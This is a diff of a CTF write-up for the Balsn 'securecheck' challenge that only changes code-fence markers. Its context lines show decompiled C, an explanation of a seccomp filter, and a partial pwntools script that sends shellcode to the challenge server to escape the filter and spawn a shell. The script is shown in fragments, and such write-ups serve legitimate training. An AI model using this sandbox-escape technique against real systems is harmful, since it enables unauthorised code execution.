@@ -9,7 +9,7 @@ So what we have in this ctf task - just an application which called `nosyscal` a
 Just an elf64 binary with two functions which are relevant `main` and `instal_syscall_filter`. Let's see what's inside `main` with decompiler's help :
 
 ## main
-~~~~
+```c
 undefined8 main(void)  
 {  
 	int32_t iVar1;  
@@ -42,7 +42,7 @@ undefined8 main(void)
 	uVar2 = (*UNRECOVERED_JUMPTABLE)(0, 0, UNRECOVERED_JUMPTABLE, 0, 0, 0);  
 	return uVar2;  
 }
-~~~~
+```
 From first view seems like `shellcode` task which gets the input, put it in the mmap and runs in both processes if child successfully exit.
 Also noticed that all regs are xored also in the `main`.
 ~~~~
@@ -65,7 +65,7 @@ Also noticed that all regs are xored also in the `main`.
 But what's happening inside `install_syscall_filter`?
 
 ## install_syscall_filter
-~~~~
+```c
 undefined8 sym.install_syscall_filter(void)  
 {  
 	int64_t iVar1;  
@@ -105,7 +105,7 @@ undefined8 sym.install_syscall_filter(void)
 	}  
 	return uVar3;  
 }
-~~~~
+```
 `prctl` calls with some variables and all `vars_*` on stack are not relevant from radare's opinion, heh.  Those  identifiers (0x16/PR_SET_SECCOMP, 0x26/PR_SET_NO_NEW_PRIVS) points out on some `seccomp` application filtering, interesting. Need to find out then what's coming as `v3`, there is only size of `v3` is pointed out but where is the data?
 
 ![install_syscall_filter variables](stack.png)
@@ -145,7 +145,7 @@ What should we do in this case?
 ## Solution
 
 After some discussion we decide to `exit` from child and run `shell` on parent with shellcode because parent will not be affected by child's limitations with `prctl`. But how we do know where we are in child or in parent? Let's coin flip and decide from it, of course it will not happen from first attempt but it should after some time. `rdtsc` will do the coin flip magic... Let's code with pwntools :
-~~~~
+```python
 #!/usr/bin/env python3  
 from pwn import *  
   
@@ -166,7 +166,7 @@ shellcode = asm(shellsource)
 p = remote('securecheck.balsnctf.com', 54321)  
 p.send(shellcode)  
 p.interactive()
-~~~~
+```
 After some attempts as expected we got the flag, hurray!
 
 *Balsn{Sam3_Cod3_Same_Cont3xt_Diff3r3nt_World}*
